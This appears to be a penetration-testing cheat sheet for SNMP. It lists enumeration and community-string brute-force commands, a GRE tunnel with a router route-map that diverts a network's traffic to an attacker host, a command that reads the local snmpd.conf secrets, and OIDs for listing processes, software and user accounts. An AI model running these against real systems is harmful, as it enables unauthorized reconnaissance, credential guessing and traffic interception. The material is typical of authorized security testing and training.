# SNMP Commands & Enumeration
======
#### SNMP Get
snmpcheck -t <ip-address> -c <community-string>
#### Brute Force Community String
snmpbrute -t <ip-address>
#### Brute Force Community Strings
onesixtyone -c <community-string-file> -i <ips-file>
#### SNMP Walk
snmpwalk -v1 -c <community-string> -t 10 <ip-address>
#### Start TFTP Server
service atftpd start
#### create GRE tunnel
```

	modprobe ip_gre
	iptunnel add mynet mode gre remote <target> local <tun0> ttl 255
	ip addr add 172.16.0.3/24 dev mynet
	route add -net 172.16.0.0 netmask 255.255.255.0 dev mynet
	ifconfig mynet up
```
#### Redirect all traffic through GRE tunnel
```

	route-map divert permit 10
	 match ip address 102
	 set ip next-hop 172.16.0.3
	
	 fe 1/0 (internal interface)
	 ip policy route-map divert
```
#### Setup Host to Catch GRE Tunnel
```

	 echo 1 > proc/sys/net/ipv4/ip_forward
	 route add -net 10.200.0.0 netmask 255.255.255.0 gw 172.16.0.1
	 iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	 iptables --append FORWARD --in-interface mynet -j ACCEPT
```
#### View Local SNMP Secrets
cat /etc/snmp/snmpd.conf

## Important MIBs
------
#### System Processes
1.3.6.1.2.1.25.1.6.0
#### Running Programs
1.3.6.1.2.1.25.4.2.1.2
#### Processes Path
1.3.6.1.2.1.25.4.2.1.4
#### Storage Units
1.3.6.1.2.1.25.2.3.1.4
#### SoftwareName
1.3.6.1.2.1.25.6.3.1.2
#### User Accounts
1.3.6.1.4.1.77.1.2.25
#### TCP Local Ports
1.3.6.1.2.1.6.13.1.3